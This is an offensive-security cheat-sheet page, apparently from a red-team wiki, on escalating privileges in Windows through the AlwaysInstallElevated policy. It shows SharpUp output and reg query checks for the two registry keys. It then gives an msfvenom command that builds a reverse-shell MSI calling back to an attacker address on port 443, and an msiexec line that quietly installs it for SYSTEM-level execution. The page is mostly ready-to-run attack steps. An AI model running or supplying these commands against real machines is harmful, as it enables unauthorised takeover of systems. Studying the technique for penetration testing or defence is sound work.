---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/privilege-escalation/windows/autoinstall-elevate
---

# AutoInstall Elevate

### Seatbelt

```basic
C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe

=== AlwaysInstallElevated Registry Keys ===

  HKLM:    1
  HKCU:    1
```

### Registry

```basic
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

Enable set value to 0x1
```

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible.

```basic
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f msi -o malicious.msi
```

```basic
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
